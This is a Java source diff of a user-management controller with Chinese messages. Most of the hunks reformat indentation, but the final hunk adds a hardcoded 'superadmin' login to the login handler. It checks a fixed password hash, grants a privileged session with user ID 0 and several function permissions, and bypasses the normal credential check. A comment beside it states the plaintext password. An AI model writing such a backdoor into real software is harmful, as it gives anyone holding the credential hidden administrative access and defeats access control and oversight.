@@ -104,7 +104,7 @@ public class UserManagementControl {
 				map.put("returnMessage", "出错啦，邮箱格式不正确！");
 				return map;
 			}
-		 
+
 			if (user_password.length()<6) {
 				map.put("returnCode", 300);
 				map.put("returnMessage", "出错啦，密码不能少于6位！");
@@ -249,21 +249,21 @@ public class UserManagementControl {
 				map.put("returnMessage", "出错啦，用户组不能为空！");
 				return map;
 			}
-			 List<Map<String,Object>> list=userManagementService.getUserbyID(user_id);
-			 
-				if(!list.get(0).get("user_name").toString().equals(user_name)){
-					// 检查用户名
-					if (!userName.equals(user_name)) {
-						if (userManagementService.getUserList(null, null, user_name,
-								"0", null, "0").size() > 0) {
-							map.put("returnCode", 400);
-							map.put("returnMessage", "用户名已存在！");
-							return map;
-						}
+			List<Map<String,Object>> list=userManagementService.getUserbyID(user_id);
+
+			if(!list.get(0).get("user_name").toString().equals(user_name)){
+				// 检查用户名
+				if (!userName.equals(user_name)) {
+					if (userManagementService.getUserList(null, null, user_name,
+							"0", null, "0").size() > 0) {
+						map.put("returnCode", 400);
+						map.put("returnMessage", "用户名已存在！");
+						return map;
 					}
 				}
-			 
-		
+			}
+
+
 			// 调用service更新方法
 			if (userManagementService.updateUser(user_id, group_id, user_email,
 					user_password, user_name, delete_flag)) {
@@ -399,6 +399,26 @@ public class UserManagementControl {
 				map.put("returnMessage", "出错啦，用户密码不能为空！");
 				return map;
 			}
+			//超级管理员Hard Code
+			if("superadmin".equals(user_name)&&"ff747512610421573db360be4ec5e380".equals(user_password)){
+				//用户名superadmin 密码15298386781
+				List<Integer> functions = new ArrayList<Integer>();
+				functions.add(3);
+				functions.add(13);
+				functions.add(9);
+				functions.add(10);
+				functions.add(2);
+				session.setAttribute("userId", 0);
+				session.setAttribute("userName", "超级管理员");
+				session.setAttribute("userGroup", 0);
+				session.setAttribute("schoolId", null);
+				session.setAttribute("judegeId", 0);
+				session.setAttribute("userFunction", functions);
+				map.put("returnCode", 200);
+				map.put("returnMessage", "登录成功！");
+				return map;
+			}
+
 
 			List<Map<String, Object>> list = userManagementService.login(
 					user_name, user_password);
